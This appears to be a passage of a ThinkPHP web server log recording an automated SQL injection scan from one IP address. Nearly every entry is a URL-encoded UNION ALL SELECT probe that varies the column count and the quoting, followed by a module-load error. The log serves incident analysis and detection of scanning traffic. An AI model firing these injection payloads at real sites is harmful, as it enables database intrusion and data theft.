[ 2015-12-31T11:33:57+08:00 ] 121.42.0.14 /index.php?s=-1968%29+UNION+ALL+SELECT+CONCAT%280x6c5171426f78%2C0x575542797068%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001220s ]
INFO: [ app_init ] --END-- [ RunTime:0.001633s ]
ERR: 无法加载模块:-1968) UNION ALL SELECT CONCAT(0x6c5171426f78,0x575542797068)#

[ 2015-12-31T11:33:58+08:00 ] 121.42.0.14 /index.php?s=-1465%29+UNION+ALL+SELECT+CONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001358s ]
INFO: [ app_init ] --END-- [ RunTime:0.001758s ]
ERR: 无法加载模块:-1465) UNION ALL SELECT CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068)#

[ 2015-12-31T11:33:59+08:00 ] 121.42.0.14 /index.php?s=-1326%29+UNION+ALL+SELECT+CONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001232s ]
INFO: [ app_init ] --END-- [ RunTime:0.001626s ]
ERR: 无法加载模块:-1326) UNION ALL SELECT CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068)#

[ 2015-12-31T11:33:59+08:00 ] 121.42.0.14 /index.php?s=-1762%29+UNION+ALL+SELECT+CONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001358s ]
INFO: [ app_init ] --END-- [ RunTime:0.001777s ]
ERR: 无法加载模块:-1762) UNION ALL SELECT CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068)#

[ 2015-12-31T11:34:00+08:00 ] 121.42.0.14 /index.php?s=-1291%29+UNION+ALL+SELECT+CONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001476s ]
INFO: [ app_init ] --END-- [ RunTime:0.002013s ]
ERR: 无法加载模块:-1291) UNION ALL SELECT CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068)#

[ 2015-12-31T11:34:01+08:00 ] 121.42.0.14 /index.php?s=-1837%29+UNION+ALL+SELECT+CONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001187s ]
INFO: [ app_init ] --END-- [ RunTime:0.001602s ]
ERR: 无法加载模块:-1837) UNION ALL SELECT CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068)#

[ 2015-12-31T11:34:01+08:00 ] 121.42.0.14 /index.php?s=-1916%27%29+UNION+ALL+SELECT+CONCAT%280x6c5171426f78%2C0x575542797068%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001164s ]
INFO: [ app_init ] --END-- [ RunTime:0.001535s ]
ERR: 无法加载模块:-1916') UNION ALL SELECT CONCAT(0x6c5171426f78,0x575542797068)#

[ 2015-12-31T11:34:02+08:00 ] 121.42.0.14 /index.php?s=-1967%27%29+UNION+ALL+SELECT+CONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001417s ]
INFO: [ app_init ] --END-- [ RunTime:0.001866s ]
ERR: 无法加载模块:-1967') UNION ALL SELECT CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068)#

[ 2015-12-31T11:34:03+08:00 ] 121.42.0.14 /index.php?s=-1049%27%29+UNION+ALL+SELECT+CONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001174s ]
INFO: [ app_init ] --END-- [ RunTime:0.001550s ]
ERR: 无法加载模块:-1049') UNION ALL SELECT CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068)#

[ 2015-12-31T11:34:03+08:00 ] 121.42.0.14 /index.php?s=-1537%27%29+UNION+ALL+SELECT+CONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001216s ]
INFO: [ app_init ] --END-- [ RunTime:0.001615s ]
ERR: 无法加载模块:-1537') UNION ALL SELECT CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068)#

[ 2015-12-31T11:34:04+08:00 ] 121.42.0.14 /index.php?s=-1709%27%29+UNION+ALL+SELECT+CONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001225s ]
INFO: [ app_init ] --END-- [ RunTime:0.001573s ]
ERR: 无法加载模块:-1709') UNION ALL SELECT CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068)#

[ 2015-12-31T11:34:05+08:00 ] 121.42.0.14 /index.php?s=-1293%27%29+UNION+ALL+SELECT+CONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001134s ]
INFO: [ app_init ] --END-- [ RunTime:0.001493s ]
ERR: 无法加载模块:-1293') UNION ALL SELECT CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068)#

[ 2015-12-31T11:34:05+08:00 ] 121.42.0.14 /index.php?s=-1108%27+UNION+ALL+SELECT+CONCAT%280x6c5171426f78%2C0x575542797068%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001110s ]
INFO: [ app_init ] --END-- [ RunTime:0.001541s ]
ERR: 无法加载模块:-1108' UNION ALL SELECT CONCAT(0x6c5171426f78,0x575542797068)#

[ 2015-12-31T11:34:06+08:00 ] 121.42.0.14 /index.php?s=-1123%27+UNION+ALL+SELECT+CONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001241s ]
INFO: [ app_init ] --END-- [ RunTime:0.001676s ]
ERR: 无法加载模块:-1123' UNION ALL SELECT CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068)#

[ 2015-12-31T11:34:07+08:00 ] 121.42.0.14 /index.php?s=-1430%27+UNION+ALL+SELECT+CONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000033s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001767s ]
INFO: [ app_init ] --END-- [ RunTime:0.002432s ]
ERR: 无法加载模块:-1430' UNION ALL SELECT CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068)#

[ 2015-12-31T11:34:07+08:00 ] 121.42.0.14 /index.php?s=-1398%27+UNION+ALL+SELECT+CONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001298s ]
INFO: [ app_init ] --END-- [ RunTime:0.001689s ]
ERR: 无法加载模块:-1398' UNION ALL SELECT CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068)#

[ 2015-12-31T11:34:08+08:00 ] 121.42.0.14 /index.php?s=-1260%27+UNION+ALL+SELECT+CONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001103s ]
INFO: [ app_init ] --END-- [ RunTime:0.001527s ]
ERR: 无法加载模块:-1260' UNION ALL SELECT CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068)#

[ 2015-12-31T11:34:09+08:00 ] 121.42.0.14 /index.php?s=-1360%27+UNION+ALL+SELECT+CONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001186s ]
INFO: [ app_init ] --END-- [ RunTime:0.001605s ]
ERR: 无法加载模块:-1360' UNION ALL SELECT CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068)#

[ 2015-12-31T11:34:09+08:00 ] 121.42.0.14 /index.php?s=-1067%25%27+UNION+ALL+SELECT+CONCAT%280x6c5171426f78%2C0x575542797068%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001116s ]
INFO: [ app_init ] --END-- [ RunTime:0.001526s ]
ERR: 无法加载模块:-1067%' UNION ALL SELECT CONCAT(0x6c5171426f78,0x575542797068)#

[ 2015-12-31T11:34:10+08:00 ] 121.42.0.14 /index.php?s=-1261%25%27+UNION+ALL+SELECT+CONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000026s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001118s ]
INFO: [ app_init ] --END-- [ RunTime:0.001485s ]
ERR: 无法加载模块:-1261%' UNION ALL SELECT CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068)#

[ 2015-12-31T11:34:10+08:00 ] 121.42.0.14 /index.php?s=-1334%25%27+UNION+ALL+SELECT+CONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001372s ]
INFO: [ app_init ] --END-- [ RunTime:0.001785s ]
ERR: 无法加载模块:-1334%' UNION ALL SELECT CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068)#

[ 2015-12-31T11:34:11+08:00 ] 121.42.0.14 /index.php?s=-1642%25%27+UNION+ALL+SELECT+CONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001601s ]
INFO: [ app_init ] --END-- [ RunTime:0.001980s ]
ERR: 无法加载模块:-1642%' UNION ALL SELECT CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068)#

[ 2015-12-31T11:34:12+08:00 ] 121.42.0.14 /index.php?s=-1548%25%27+UNION+ALL+SELECT+CONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001377s ]
INFO: [ app_init ] --END-- [ RunTime:0.001813s ]
ERR: 无法加载模块:-1548%' UNION ALL SELECT CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068)#

[ 2015-12-31T11:34:12+08:00 ] 121.42.0.14 /index.php?s=-1657%25%27+UNION+ALL+SELECT+CONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001090s ]
INFO: [ app_init ] --END-- [ RunTime:0.001444s ]
ERR: 无法加载模块:-1657%' UNION ALL SELECT CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068)#

[ 2015-12-31T11:34:13+08:00 ] 121.42.0.14 /index.php?s=-1314+UNION+ALL+SELECT+CONCAT%280x6c5171426f78%2C0x575542797068%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001167s ]
INFO: [ app_init ] --END-- [ RunTime:0.001527s ]
ERR: 无法加载模块:-1314 UNION ALL SELECT CONCAT(0x6c5171426f78,0x575542797068)#

[ 2015-12-31T11:34:14+08:00 ] 121.42.0.14 /index.php?s=-1447+UNION+ALL+SELECT+CONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001232s ]
INFO: [ app_init ] --END-- [ RunTime:0.001732s ]
ERR: 无法加载模块:-1447 UNION ALL SELECT CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068)#

[ 2015-12-31T11:34:14+08:00 ] 121.42.0.14 /index.php?s=-1927+UNION+ALL+SELECT+CONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001101s ]
INFO: [ app_init ] --END-- [ RunTime:0.001463s ]
ERR: 无法加载模块:-1927 UNION ALL SELECT CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068)#

[ 2015-12-31T11:34:15+08:00 ] 121.42.0.14 /index.php?s=-1796+UNION+ALL+SELECT+CONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001118s ]
INFO: [ app_init ] --END-- [ RunTime:0.001511s ]
ERR: 无法加载模块:-1796 UNION ALL SELECT CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068)#

[ 2015-12-31T11:34:16+08:00 ] 121.42.0.14 /index.php?s=-1770+UNION+ALL+SELECT+CONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001254s ]
INFO: [ app_init ] --END-- [ RunTime:0.001618s ]
ERR: 无法加载模块:-1770 UNION ALL SELECT CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068)#

[ 2015-12-31T11:34:16+08:00 ] 121.42.0.14 /index.php?s=-1473+UNION+ALL+SELECT+CONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001180s ]
INFO: [ app_init ] --END-- [ RunTime:0.001567s ]
ERR: 无法加载模块:-1473 UNION ALL SELECT CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068)#

[ 2015-12-31T11:34:17+08:00 ] 121.42.0.14 /index.php?s=-1091+UNION+ALL+SELECT+CONCAT%280x6c5171426f78%2C0x575542797068%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001432s ]
INFO: [ app_init ] --END-- [ RunTime:0.001880s ]
ERR: 无法加载模块:-1091 UNION ALL SELECT CONCAT(0x6c5171426f78,0x575542797068)#

[ 2015-12-31T11:34:18+08:00 ] 121.42.0.14 /index.php?s=-1713+UNION+ALL+SELECT+CONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001237s ]
INFO: [ app_init ] --END-- [ RunTime:0.001608s ]
ERR: 无法加载模块:-1713 UNION ALL SELECT CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068)#

[ 2015-12-31T11:34:18+08:00 ] 121.42.0.14 /index.php?s=-1607+UNION+ALL+SELECT+CONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001119s ]
INFO: [ app_init ] --END-- [ RunTime:0.001494s ]
ERR: 无法加载模块:-1607 UNION ALL SELECT CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068)#

[ 2015-12-31T11:34:19+08:00 ] 121.42.0.14 /index.php?s=-1697+UNION+ALL+SELECT+CONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001130s ]
INFO: [ app_init ] --END-- [ RunTime:0.001473s ]
ERR: 无法加载模块:-1697 UNION ALL SELECT CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068)#

[ 2015-12-31T11:34:20+08:00 ] 121.42.0.14 /index.php?s=-1802+UNION+ALL+SELECT+CONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001309s ]
INFO: [ app_init ] --END-- [ RunTime:0.001671s ]
ERR: 无法加载模块:-1802 UNION ALL SELECT CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068)#

[ 2015-12-31T11:34:20+08:00 ] 121.42.0.14 /index.php?s=-1998+UNION+ALL+SELECT+CONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%2CCONCAT%280x6c5171426f78%2C0x575542797068%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001092s ]
INFO: [ app_init ] --END-- [ RunTime:0.001505s ]
ERR: 无法加载模块:-1998 UNION ALL SELECT CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068),CONCAT(0x6c5171426f78,0x575542797068)#

[ 2015-12-31T11:34:21+08:00 ] 121.42.0.14 /index.php?s=-1191%29+UNION+ALL+SELECT+CONCAT%280x61686f466242%2C0x764a42744678%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001272s ]
INFO: [ app_init ] --END-- [ RunTime:0.001722s ]
ERR: 无法加载模块:-1191) UNION ALL SELECT CONCAT(0x61686f466242,0x764a42744678)-- 

[ 2015-12-31T11:34:22+08:00 ] 121.42.0.14 /index.php?s=-1752%29+UNION+ALL+SELECT+CONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.004675s ]
INFO: [ app_init ] --END-- [ RunTime:0.005354s ]
ERR: 无法加载模块:-1752) UNION ALL SELECT CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678)-- 

[ 2015-12-31T11:34:23+08:00 ] 121.42.0.14 /index.php?s=-1237%29+UNION+ALL+SELECT+CONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29--+
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: Run Common\Behavior\InitHookBehavior [ RunTime:0.001194s ]
INFO: [ app_init ] --END-- [ RunTime:0.001553s ]
ERR: 无法加载模块:-1237) UNION ALL SELECT CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678),CONCAT(0x61686f466242,0x764a42744678)-- 

[ 2015-12-31T11:34:23+08:00 ] 121.42.0.14 /index.php?s=-1619%29+UNION+ALL+SELECT+CONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29%2CCONCAT%280x61686f466242%2C0x764a42744678%29--+
INFO: [ app_init ] --START--
